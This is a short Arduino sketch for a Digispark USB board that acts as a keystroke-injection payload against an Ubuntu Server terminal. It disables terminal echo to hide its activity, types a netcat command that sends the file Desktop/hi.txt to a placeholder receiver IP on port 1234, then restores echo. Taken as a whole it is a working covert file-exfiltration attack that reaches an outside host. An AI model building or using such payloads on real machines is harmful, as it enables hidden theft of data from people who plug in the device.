#include "DigiKeyboard.h"

// Meant to run on Ubuntu Server

void setup() {
  // put your setup code here, to run once:

}

bool finished = false;
void loop() {
  if (not finished) {
    DigiKeyboard.sendKeyStroke(0);
    
    // disable terminal echoing
    DigiKeyboard.print("stty -echo");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    
    // send the file 'hi.txt' to your computer
    //  ** replace the IP address below with your computer's IP address **
    DigiKeyboard.print("nc [receiver's IP address here] 1234 < Desktop/hi.txt");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(3000);
    
    // quit process if it hasn't quit already
    DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
    DigiKeyboard.delay(500);
    
    // re-enable terminal echoing
    DigiKeyboard.print("stty echo");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    
    finished = true;
  }
}
